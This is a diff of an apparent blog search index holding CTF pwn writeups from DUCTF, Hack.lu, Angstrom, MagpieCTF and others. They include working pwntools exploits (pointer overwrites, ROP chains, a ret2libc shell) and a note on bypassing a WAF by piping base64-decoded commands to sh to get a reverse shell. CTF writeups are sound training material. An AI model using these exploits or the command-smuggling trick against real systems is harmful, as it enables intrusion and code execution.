+exe &#x3D; context.binary &#x3D; ELF(&#39;babygame&#39;)
+
+# Many built-in settings can be controlled on the command-line and show up
+# in &quot;args&quot;.  For example, to dump all data sent&#x2F;received, and disable ASLR
+# for all created processes...
+# .&#x2F;exploit.py DEBUG NOASLR
+# .&#x2F;exploit.py GDB HOST&#x3D;example.com PORT&#x3D;4141
+host &#x3D; args.HOST or &#39;pwn-2021.duc.tf&#39;
+port &#x3D; int(args.PORT or 31907)
+
+def start_local(argv&#x3D;[], *a, **kw):
+    &#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript&#x3D;gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv&#x3D;[], *a, **kw):
+    &#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
+    io &#x3D; connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript&#x3D;gdbscript)
+    return io
+
+def start(argv&#x3D;[], *a, **kw):
+    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# .&#x2F;exploit.py GDB
+gdbscript &#x3D; &#39;&#39;&#39;
+tbreak main
+continue
+&#39;&#39;&#39;.format(**locals())
+
+#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+#                    EXPLOIT GOES HERE
+#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+# Arch:     amd64-64-little
+# RELRO:    Partial RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+
+with open(&quot;&#x2F;bin&#x2F;sh&quot;,&quot;rb&quot;) as f:
+    a &#x3D; f.read(4)
+    print(&quot;num&quot;,int.from_bytes(a,&quot;little&quot;))
+
+io &#x3D; start()
+
+io.sendafter(b&quot;name?\n&quot;,b&quot;a&quot;*32)
+io.sendafter(b&quot;Username\n&gt; &quot;,b&quot;2&quot;)
+print(io.recv(32))
+a &#x3D; io.recvn(6)
+# b &#x3D; io.recvn(6)
+ptr &#x3D; (int.from_bytes(a,&quot;little&quot;)+0x20a3-0x2024).to_bytes(0x6,&quot;little&quot;)
+print(ptr)
+io.sendafter(b&quot;Username\n&gt; &quot;,b&quot;1&quot;)
+print(&quot;overwrite pointer&quot;)
+io.sendafter(b&quot;username to?\n&quot;,b&quot;a&quot;*32+ptr)
+print(&quot;overwrite pointer ok&quot;)
+print(io.recv(1024))
+io.send(b&quot;1337&quot;)
+print(io.recv(1024))
+io.send(b&#39;1179403647&#39;)
+io.interactive()
+
+DUCTF{whats_in_a_name?_5aacfc58}
 ]]></content>
   </entry>
   <entry>
@@ -11634,11 +11516,120 @@ flagDUCTF{1_sm@LL_0ver5ight&#x3D;0v3rFLOW}
 ]]></content>
   </entry>
   <entry>
-    <title>TrendMicro CTF 2021</title>
-    <url>/ctf-writeup/2021/trendmicroctf/index.html</url>
-    <content><![CDATA[TrendMicro CTF 2021RankChallenges
-OSINT2
-PyPuzzle
+    <title>【Hack.lu CTF 2021】secure prototype 【pwn】</title>
+    <url>/ctf-writeup/2021/hackerluctf/hacker-lu-2021-secure-prototype.html</url>
+    <content><![CDATA[0x1 introductionhttps://flu.xxx/challenges/16
+0x3 Mitigations# Arch:     arm-32-little
+# RELRO:    Partial RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x10000)
+
+0x3 Solutionchallenge contains 3 file, challenge.elf, stonks.txt, flag.txt
+using decompiler and take a deep look at functions.
+
+
+
+after enter the correct command and enter three variable, it will jump to function at 108e0, 108e0 contains a switch that call different function depending on the command user enter.
+
+notice that string &quot;stonks.txt&quot; are stored in the byte_22058, and with commmand 48, function sub_10B80 will read byte_22058 as a filename, and print out whether in the file.
+so, we got an idea that if we need get the flag, we need to change byte_22058 to &quot;flag.txt&quot; instead of &quot;stonks.txt&quot;
+looking at other commands, command 1056 allow us pass a integer as a pointer to an function (lets say funcA).
+and with command 4619, we have call funcA with our 1st and 2nd parameter.
+so, here is the question. Is there any function that take 2 pointer parameter and can modify a string. 
+the answer is plt:00010570 __isoc99_scanf, we can use scanf(&quot;%s&quot;,char* str) to read input from stdin and write str.
+in this case, str is the address of byte_22058, and &quot;%s&quot; can also found in the data section.
+therefore, we have the process of getting the flag.
+
+use 1056: change function address to scanf
+use 4619: call scanf and write flag.txt to byte_22058
+use 48: print out the file content in filename(byte_22058)
+
+0x4 exp.py#!&#x2F;usr&#x2F;bin&#x2F;env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template &#39;--host&#x3D;flu.xxx&#39; &#39;--port&#x3D;20040&#39; challenge.elf
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe &#x3D; context.binary &#x3D; ELF(&#39;challenge.elf&#39;)
+
+# Many built-in settings can be controlled on the command-line and show up
+# in &quot;args&quot;.  For example, to dump all data sent&#x2F;received, and disable ASLR
+# for all created processes...
+# .&#x2F;exploit.py DEBUG NOASLR
+# .&#x2F;exploit.py GDB HOST&#x3D;example.com PORT&#x3D;4141
+host &#x3D; args.HOST or &#39;flu.xxx&#39;
+port &#x3D; int(args.PORT or 20040)
+
+def start_local(argv&#x3D;[], *a, **kw):
+    &#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript&#x3D;gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv&#x3D;[], *a, **kw):
+    &#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;
+    io &#x3D; connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript&#x3D;gdbscript)
+    return io
+
+def start(argv&#x3D;[], *a, **kw):
+    &#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# .&#x2F;exploit.py GDB
+gdbscript &#x3D; &#39;&#39;&#39;
+tbreak *0x&#123;exe.entry:x&#125;
+continue
+&#39;&#39;&#39;.format(**locals())
+
+#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+#                    EXPLOIT GOES HERE
+#&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+# Arch:     arm-32-little
+# RELRO:    Partial RELRO
+# Stack:    Canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x10000)
+
+io &#x3D; start()
+print(1,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
+io.sendline(b&quot;1056&quot;)
+print(2,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
+io.sendline(b&quot;66928 0 0&quot;)
+print(3,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
+io.sendline(b&quot;4919&quot;)
+print(4,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
+io.sendline(b&quot;70140 139352 0&quot;)
+io.sendline(b&quot;flag.txt\x00&quot;)
+print(5,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
+io.sendline(b&quot;48&quot;)
+print(6,io.recvuntil(b&quot;&gt;&gt;&gt;&quot;))
+io.sendline(b&quot;123 456 789&quot;)
+print(io.recv())
+
+
+
+print(&quot;%%s&quot;,0x111fc)
+print(&quot;22058&quot;,0x0022058)
+print(&quot;scanf&quot;,0x00010570)
+
+0x5 flagflag{gl0bal_st0nkz_and_gl0bal_var1abl3}
+]]></content>
+  </entry>
+  <entry>
+    <title>Hacker.lu CTF 2021</title>
+    <url>/ctf-writeup/2021/hackerluctf/index.html</url>
+    <content><![CDATA[Hacker.lu CTF 2021RankChallenges
+[Pwn] secure-prototype
 
 ]]></content>
   </entry>
@@ -12097,6 +12088,15 @@ flagSECCON{M4k3_My_4bi1i7i3s_4v3r4g3_in_7h3_N3x7_Lif3_cpwWz9jpoCmKYBvf}
 ]]></content>
   </entry>
   <entry>
+    <title>TrendMicro CTF 2021</title>
+    <url>/ctf-writeup/2021/trendmicroctf/index.html</url>
+    <content><![CDATA[TrendMicro CTF 2021RankChallenges
+OSINT2
+PyPuzzle
+
+]]></content>
+  </entry>
+  <entry>
     <title>[Trendmicro 2021] OSINTⅡ 400</title>
     <url>/ctf-writeup/2021/trendmicroctf/trendmicro-2021-osint2-400.html</url>
     <content><![CDATA[main concept: code review, image stego, web, zero-width Steganography
@@ -12440,18 +12440,6 @@ writeup
 ]]></content>
   </entry>
   <entry>
-    <title>Nahamcon CTF 2022</title>
-    <url>/ctf-writeup/2022/nahamcon/index.html</url>
-    <content><![CDATA[Nahamcon CTF 2022https://ctf.nahamcon.com/
-Challenges
-[warmup&amp;rev] flagcat
-[warmup&amp;pwn] crash_override
-[pwn] detour
-[pwn] reading_list
-
-]]></content>
-  </entry>
-  <entry>
     <title>[web] a replication of go-fs [magpie ctf]</title>
     <url>/ctf-writeup/2022/magpiectf/magpie-ctf-2020-writeup.html</url>
     <content><![CDATA[0x0 IntroductionI participate magpie ctf a few weeks ago. Our team go 2nd place, which is pretty good. And we also got $512 (102 for each team members) for reward of getting 2nd
@@ -12493,17 +12481,14 @@ solution: curl --path-as-is -X CONNECT http://localhost/../flag
 ]]></content>
   </entry>
   <entry>
-    <title>San Diego CTF 2022</title>
-    <url>/ctf-writeup/2022/sdctf/index.html</url>
-    <content><![CDATA[San Diego CTF 2022https://sdc.tf/
-Official Repo: https://github.com/acmucsd/sdctf-2022
-Rank3rd place (MapleBacon)
+    <title>Nahamcon CTF 2022</title>
+    <url>/ctf-writeup/2022/nahamcon/index.html</url>
+    <content><![CDATA[Nahamcon CTF 2022https://ctf.nahamcon.com/
 Challenges
-[pwn] Oil Spill
-[pwn] horoscope
-[pwn] breakfast-menu
-[pwn] secure-horoscope
-[pwn] shamav
+[warmup&amp;rev] flagcat
+[warmup&amp;pwn] crash_override
+[pwn] detour
+[pwn] reading_list
 
 ]]></content>
   </entry>
@@ -12517,12 +12502,17 @@ writeup
 ]]></content>
   </entry>
   <entry>
-    <title>Sekai CTF 2022</title>
-    <url>/ctf-writeup/2022/sekaictf/index.html</url>
-    <content><![CDATA[Tamu CTF 2022https://ctf.sekai.team/
-Rank8 place (MapleBacon)
+    <title>San Diego CTF 2022</title>
+    <url>/ctf-writeup/2022/sdctf/index.html</url>
+    <content><![CDATA[San Diego CTF 2022https://sdc.tf/
+Official Repo: https://github.com/acmucsd/sdctf-2022
+Rank3rd place (MapleBacon)
 Challenges
-[pwn] saveme
+[pwn] Oil Spill
+[pwn] horoscope
+[pwn] breakfast-menu
+[pwn] secure-horoscope
+[pwn] shamav
 
 ]]></content>
   </entry>
@@ -13241,6 +13231,16 @@ flag: maple{nyo_wespect_fow_boundawies}
 ]]></content>
   </entry>
   <entry>
+    <title>Sekai CTF 2022</title>
+    <url>/ctf-writeup/2022/sekaictf/index.html</url>
+    <content><![CDATA[Tamu CTF 2022https://ctf.sekai.team/
+Rank8 place (MapleBacon)
+Challenges
+[pwn] saveme
+
+]]></content>
+  </entry>
+  <entry>
     <title>Tamu CTF 2022</title>
     <url>/ctf-writeup/2022/tamuctf/index.html</url>
     <content><![CDATA[Tamu CTF 2022https://tamuctf.com/
@@ -13403,6 +13403,17 @@ io.sendlineafter(b&quot;Give me your data\n&quot;,b&quot;A&quot;*0x70)
 io.interactive()]]></content>
   </entry>
   <entry>
+    <title>Bo1lersCTF 2023</title>
+    <url>/ctf-writeup/2023/bo1lersctf/index.html</url>
+    <content><![CDATA[Bo1lersCTF 2023https://ctftime.org/event/1875
+https://github.com/b01lers/b01lers-ctf-2023-public
+Rank1 th place (MapleBacon)
+Challenges
+[pwn] cfifufuuufuuuuu
+
+]]></content>
+  </entry>
+  <entry>
     <title>Kalmar CTF 2023</title>
     <url>/ctf-writeup/2023/kalmar/index.html</url>
     <content><![CDATA[Kalmar CTF 2023https://ctftime.org/event/1878/
@@ -13414,13 +13425,13 @@ Challenges
 ]]></content>
   </entry>
   <entry>
-    <title>Bo1lersCTF 2023</title>
-    <url>/ctf-writeup/2023/bo1lersctf/index.html</url>
-    <content><![CDATA[Bo1lersCTF 2023https://ctftime.org/event/1875
-https://github.com/b01lers/b01lers-ctf-2023-public
-Rank1 th place (MapleBacon)
+    <title>MagpieCTF 2023</title>
+    <url>/ctf-writeup/2023/magpiectf/index.html</url>
+    <content><![CDATA[MagpieCTF 2023https://github.com/infosec-ucalgary/magpieCTF-2023
+Rank5 th place (MapleBacon)
+Notesthis ctf is literally a guessing game.
 Challenges
-[pwn] cfifufuuufuuuuu
+writeup
 
 ]]></content>
   </entry>
@@ -13433,17 +13444,6 @@ Challenges
 [[pwn] bot]
 [[pwn] rickroll]
 [[pwn] rut-roh-relro]
-
-]]></content>
-  </entry>
-  <entry>
-    <title>MagpieCTF 2023</title>
-    <url>/ctf-writeup/2023/magpiectf/index.html</url>
-    <content><![CDATA[MagpieCTF 2023https://github.com/infosec-ucalgary/magpieCTF-2023
-Rank5 th place (MapleBacon)
-Notesthis ctf is literally a guessing game.
-Challenges
-writeup
 
 ]]></content>
   </entry>
@@ -13511,73 +13511,6 @@ int main()
 
 0x3 Flag &amp; ThoughtsIt is actually more like a pwn problem.
 CakeCTF{briI1ng_yoO0ur_oO0wn_gaA4dgeE3t!}
-]]></content>
-  </entry>
-  <entry>
-    <title>MagpieCTF 2023 Writeup</title>
-    <url>/ctf-writeup/2023/magpiectf/writeup/index.html</url>
-    <content><![CDATA[0x0 Before allI don&#39;t like this ctf. And most of challenge is not worth to craft a writeup.
-all files can be found in https://github.com/infosec-ucalgary/magpieCTF-2023
-0x1 [PWN] no-password-herefiles
-scanf(&quot;%s&quot;) buffer overflow
-char Test[20];
-... 
-char input[20];
-...
-&#x2F;&#x2F;Check password
-if (strncmp(Test,input,20) &#x3D;&#x3D; 0)
-&#123;
-
-payload: &#39;A&#39;*40
-flag: magpie{5c4nf_n07_54f3}
-0x2 [PWN] no-password-herefiles
-ret2win. fill stack with 56 + 4 padding. then overwrite eip
-void win()&#123;
-    printf(&quot;Here is your flag:\n&quot;);
-    exit(0);
-&#125;
-void vuln()&#123;
-  char buf[56];
-  gets(buf);
-&#125;
-
-flag: magpie{0mn1_fl4g_3v3rywh3r3}
-0x3 [Web] education-comes-firstfiles
-call hex2a in web console
-hex2a(&#39;6d61677069657b57335f525f5337314c4c5f483352337d&#39;)
-
-flag: magpie{W3_R_S71LL_H3R3}
-0x4 [Forensic] there-is-no-flagfiles
-
-binwalk to extract Flag.PNG
-recover modify png header
-read flag
-
-flag: magpie{m15510n_c0mpl373_w17h_r35p3c7}
-0x5 [Network] eavesdropperfiles
-
-open .pcapng file
-find http request with largest request body, flag is in the http body
-
-flag: magpie{chOc0LatE_Ch1p_c0Ok1e5}
-0x5 [Network] knock-knock-anyone-there
-bypass waf using printf cmd_in_base_64 | base64 -d | sh
-setting up reverse shell
-find password of user sappheiros using cat /opt/backup/* (5up32_53cu23_p455w02d123)
-su sappheiros
-first half flag is in cat /home/sappheiros/message.txt
-tcpdump -nnA host 172.16.238.30
-second half flag is hidden inside ids of icmp packets.
-
-from scapy.all import *
-
-pcap &#x3D; rdpcap(&#39;dump.pcap&#39;)
-
-data &#x3D; [p[ICMP] for p in pcap if ICMP in p]
-
-print(b&#39;&#39;.join([bytes([d.id]) for d in data]).split(b&#39;&#125;&#39;))
-
-flag: magpie{y0u_h4v3_7h3_p0w32_70_54v3_7h3_w021d}
 ]]></content>
   </entry>
   <entry>
@@ -13652,6 +13585,73 @@ io.sendlineafter(b"choice: ",b'3')
 io.sendlineafter(b"str: ",b'A'*0x20)
 io.sendlineafter(b"choice: ",b'5')
 io.interactive()]]></content>
+  </entry>
+  <entry>
+    <title>MagpieCTF 2023 Writeup</title>
+    <url>/ctf-writeup/2023/magpiectf/writeup/index.html</url>
+    <content><![CDATA[0x0 Before allI don&#39;t like this ctf. And most of challenge is not worth to craft a writeup.
+all files can be found in https://github.com/infosec-ucalgary/magpieCTF-2023
+0x1 [PWN] no-password-herefiles
+scanf(&quot;%s&quot;) buffer overflow
+char Test[20];
+... 
+char input[20];
+...
+&#x2F;&#x2F;Check password
+if (strncmp(Test,input,20) &#x3D;&#x3D; 0)
+&#123;
+
+payload: &#39;A&#39;*40
+flag: magpie{5c4nf_n07_54f3}
+0x2 [PWN] no-password-herefiles
+ret2win. fill stack with 56 + 4 padding. then overwrite eip
+void win()&#123;
+    printf(&quot;Here is your flag:\n&quot;);
+    exit(0);
+&#125;
+void vuln()&#123;
+  char buf[56];
+  gets(buf);
+&#125;
+
+flag: magpie{0mn1_fl4g_3v3rywh3r3}
+0x3 [Web] education-comes-firstfiles
+call hex2a in web console
+hex2a(&#39;6d61677069657b57335f525f5337314c4c5f483352337d&#39;)
+
+flag: magpie{W3_R_S71LL_H3R3}
+0x4 [Forensic] there-is-no-flagfiles
+
+binwalk to extract Flag.PNG
+recover modify png header
+read flag
+
+flag: magpie{m15510n_c0mpl373_w17h_r35p3c7}
+0x5 [Network] eavesdropperfiles
+
+open .pcapng file
+find http request with largest request body, flag is in the http body
+
+flag: magpie{chOc0LatE_Ch1p_c0Ok1e5}
+0x5 [Network] knock-knock-anyone-there
+bypass waf using printf cmd_in_base_64 | base64 -d | sh
+setting up reverse shell
+find password of user sappheiros using cat /opt/backup/* (5up32_53cu23_p455w02d123)
+su sappheiros
+first half flag is in cat /home/sappheiros/message.txt
+tcpdump -nnA host 172.16.238.30
+second half flag is hidden inside ids of icmp packets.
+
+from scapy.all import *
+
+pcap &#x3D; rdpcap(&#39;dump.pcap&#39;)
+
+data &#x3D; [p[ICMP] for p in pcap if ICMP in p]
+
+print(b&#39;&#39;.join([bytes([d.id]) for d in data]).split(b&#39;&#125;&#39;))
+
+flag: magpie{y0u_h4v3_7h3_p0w32_70_54v3_7h3_w021d}
+]]></content>
   </entry>
   <entry>
     <title>[Pwn] caniride [Angstrom CTF 2022]</title>
@@ -13862,6 +13862,47 @@ io.interactive()
 ]]></content>
   </entry>
   <entry>
+    <title>[Pwn] really obnoxious problem [Angstrom CTF 2022]</title>
+    <url>/ctf-writeup/2022/angstrom/pwn/really_obnoxious_problem/index.html</url>
+    <content><![CDATA[0x0 IntroductionYou know the drill.
+nc challs.actf.co 31225
+Author: JoshDaBosh
+files: really_obnoxious_problem
+0x1 MitigationArch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)
+
+
+0x2 Vulnerabilitysimple buffer overflow, main function use gets. overwrite rip to a ropchain that calls sym.flag. 
+sym.flag check two parameter, so we also need set rdi and rsi to the correct value in the ropchain.
+0x3 Exploitfrom pwn import *
+
+io &#x3D; connect(&quot;challs.actf.co&quot;,31225)
+exe &#x3D; context.binary &#x3D; ELF(&quot;really_obnoxious_problem&quot;)
+exe_rop &#x3D; ROP(exe)
+ret_addr &#x3D; exe_rop.find_gadget([&#39;ret&#39;])[0]
+pop_rdi_ret_addr &#x3D; exe_rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])[0]
+# pop_rsi_ret_addr &#x3D; exe_rop.find_gadget([&#39;pop rsi&#39;, &#39;ret&#39;])[0]
+io.sendlineafter(b&quot;Name:&quot;,b&quot;bobby&quot;+b&#39;A&#39;*(49-5))
+io.sendlineafter(b&quot;Address:&quot;,flat(&#123;
+    0x40+0x8:[
+        pop_rdi_ret_addr,
+        0x1337,
+        0x00000000004013f1, # pop rsi, pop something ret
+        exe.symbols[&quot;name&quot;],
+        0,
+        exe.sym[&quot;flag&quot;]
+    ]&#125;))
+
+io.interactive()
+
+
+0x4 Flagactf{so_swe3t_so_c0ld_so_f4ir_7167cfa2c019}
+]]></content>
+  </entry>
+  <entry>
     <title>[Pwn] dreams [Angstrom CTF 2022]</title>
     <url>/ctf-writeup/2022/angstrom/pwn/dreams/index.html</url>
     <content><![CDATA[0x0 IntroductionSometimes I want to just stay in my dreams.
@@ -13964,47 +14005,6 @@ io.interactive()
 ]]></content>
   </entry>
   <entry>
-    <title>[Pwn] really obnoxious problem [Angstrom CTF 2022]</title>
-    <url>/ctf-writeup/2022/angstrom/pwn/really_obnoxious_problem/index.html</url>
-    <content><![CDATA[0x0 IntroductionYou know the drill.
-nc challs.actf.co 31225
-Author: JoshDaBosh
-files: really_obnoxious_problem
-0x1 MitigationArch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-
-
-0x2 Vulnerabilitysimple buffer overflow, main function use gets. overwrite rip to a ropchain that calls sym.flag. 
-sym.flag check two parameter, so we also need set rdi and rsi to the correct value in the ropchain.
-0x3 Exploitfrom pwn import *
-
-io &#x3D; connect(&quot;challs.actf.co&quot;,31225)
-exe &#x3D; context.binary &#x3D; ELF(&quot;really_obnoxious_problem&quot;)
-exe_rop &#x3D; ROP(exe)
-ret_addr &#x3D; exe_rop.find_gadget([&#39;ret&#39;])[0]
-pop_rdi_ret_addr &#x3D; exe_rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])[0]
-# pop_rsi_ret_addr &#x3D; exe_rop.find_gadget([&#39;pop rsi&#39;, &#39;ret&#39;])[0]
-io.sendlineafter(b&quot;Name:&quot;,b&quot;bobby&quot;+b&#39;A&#39;*(49-5))
-io.sendlineafter(b&quot;Address:&quot;,flat(&#123;
-    0x40+0x8:[
-        pop_rdi_ret_addr,
-        0x1337,
-        0x00000000004013f1, # pop rsi, pop something ret
-        exe.symbols[&quot;name&quot;],
-        0,
-        exe.sym[&quot;flag&quot;]
-    ]&#125;))
-
-io.interactive()
-
-
-0x4 Flagactf{so_swe3t_so_c0ld_so_f4ir_7167cfa2c019}
-]]></content>
-  </entry>
-  <entry>
     <title>[Pwn] wah [Angstrom CTF 2022]</title>
     <url>/ctf-writeup/2022/angstrom/pwn/wah/index.html</url>
     <content><![CDATA[0x0 IntroductionBaby friendly!
@@ -14031,70 +14031,6 @@ print(io.recv())
 
 
 0x4 Flagactf{lo0k_both_w4ys_before_y0u_cros5_my_m1nd_c9a2c82aba6e}
-]]></content>
-  </entry>
-  <entry>
-    <title>[Pwn] whereami [Angstrom CTF 2022]</title>
-    <url>/ctf-writeup/2022/angstrom/pwn/whereami/index.html</url>
-    <content><![CDATA[0x0 IntroductionClick on the eyes.
-@_@
-nc challs.actf.co 31222
-files: whereami, libc.so.6
-0x1 MitigationArch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-
-
-0x2 Vulnerabilityclassic ret2libc chall, in function main there is a gets function. We can use this gets to construct rop chain. 
-One thing to notice is that function main have a counter, counter increase by 1 everytime we call main. if counter is larger than 0, program will exit immediately. Therefore, in the first ropchain, we also need to set counter back to 0.
-So, we need to construct following rop chain.
-first ropchain
-puts(got.printf) # leak libc address
-gets(obj.counter) # set counter to 0
-main()
-
-second ropchain
-sysmte(&quot;&#x2F;bin&#x2F;sh&quot;)
-
-then we got a shell.
-0x3 Exploitio &#x3D; start()
-wait_for_debugger(io)
-
-ret_addr &#x3D; exe_rop.find_gadget([&#39;ret&#39;])[0]
-pop_rdi_ret_addr &#x3D; exe_rop.find_gadget([&#39;pop rdi&#39;, &#39;ret&#39;])[0]
-print(pop_rdi_ret_addr,ret_addr)
-io.sendlineafter(b&quot;you?&quot;,flat(&#123;
-    0x40+0x8: [
-        ret_addr,
-        pop_rdi_ret_addr,
-        exe.got[&quot;printf&quot;],
-        exe.plt[&quot;puts&quot;],
-        pop_rdi_ret_addr,
-        exe.symbols[&quot;counter&quot;],
-        exe.plt[&quot;gets&quot;],
-        exe.sym[&quot;main&quot;],
-    ]
-&#125;))
-print(io.recvuntil(b&#39;too.\n&#39;))
-libc_base_addr &#x3D; int.from_bytes(io.recvuntil(b&#39;\n&#39;,drop&#x3D;True),&quot;little&quot;) - libc.sym[&quot;printf&quot;]
-input(hex(libc_base_addr))
-io.sendline(flat(&#123;0:[0]&#125;))
-print(hex(libc_base_addr+libc.sym[&quot;system&quot;]))
-io.sendlineafter(b&quot;you? &quot;,flat(&#123;
-    0x40:b&quot;AAAAAAAA&quot;,
-    0x40+0x8: [
-        ret_addr,
-        pop_rdi_ret_addr,
-        libc_base_addr+next(libc.search(b&quot;&#x2F;bin&#x2F;sh&quot;)),
-        libc_base_addr+libc.sym[&quot;system&quot;],
-    ]
-&#125;))
-io.interactive()
-
-
-0x4 Flagactf{i&#39;d_be_saf3_and_w4rm_if_1_wa5_in_la_5ca5e33ff06f}
 ]]></content>
   </entry>
   <entry>
@@ -14327,51 +14263,67 @@ io.interactive()
 ]]></content>
   </entry>
   <entry>
-    <title>[Pwn] gambler-overflow [Bo1lers CTF 2022]</title>
-    <url>/ctf-writeup/2022/bo1lers/pwn/gambler-overflow/index.html</url>
-    <content><![CDATA[0x0 IntroductionFeeling luuuuuuuucky?
-You must create a flag.txt in the same folder as the binary for it to run.nc ctf.b01lers.com 9203
-Author: robotearthpizzaDifficulty: Easy
-files: gambler_overflow
+    <title>[Pwn] whereami [Angstrom CTF 2022]</title>
+    <url>/ctf-writeup/2022/angstrom/pwn/whereami/index.html</url>
+    <content><![CDATA[0x0 IntroductionClick on the eyes.
+@_@
+nc challs.actf.co 31222
+files: whereami, libc.so.6
 0x1 MitigationArch:     amd64-64-little
-RELRO:    Full RELRO
-Stack:    Canary found
+RELRO:    Partial RELRO
+Stack:    No canary found
 NX:       NX enabled
-PIE:      PIE enabled
-
-0x2 Vulnerabilityfunction sym.casino ask for a 4 byte string using gets, then it compare with a random string generate by sym.imp.rand(). 
-If we enter the same string as the random one, we get certain amount of money. If we have more than 1000 in balance, the program will print out the flag
-│           ; var signed int64_t var_1ch @ rbp-0x1c
-│           ; var char *s2 @ rbp-0x18
-│           ; var char *s1 @ rbp-0x10
-│           ; var int64_t canary @ rbp-0x8
-&#123;
-    do &#123;
-        &#x2F;&#x2F; generate random string
-        sym.imp.gets(&amp;s2);
-        iVar1 &#x3D; sym.imp.strcmp(&amp;s1);
-        &#x2F;&#x2F; add or subtract balance depend on the result
-    &#125; while (_obj.balance &lt; 1000);
-    sym.give_flag();
-    return;
-&#125;
-
-it uses gets, so we can overwrite s1 by s2. so that we can make s2 and s1 same.
-0x3 Exploitfrom pwn import *
+PIE:      No PIE (0x400000)
 
 
-io &#x3D; start()
-try:
-    while True:
-        lp(io.sendlineafter(b&quot;letters: &quot;,b&quot;AAAAAAA\x00AAAAAAA\x00&quot;))
-except:
-    pass
-print(io.recv())
+0x2 Vulnerabilityclassic ret2libc chall, in function main there is a gets function. We can use this gets to construct rop chain. 
+One thing to notice is that function main have a counter, counter increase by 1 everytime we call main. if counter is larger than 0, program will exit immediately. Therefore, in the first ropchain, we also need to set counter back to 0.
+So, we need to construct following rop chain.
+first ropchain
+puts(got.printf) # leak libc address
+gets(obj.counter) # set counter to 0
+main()
 
+second ropchain
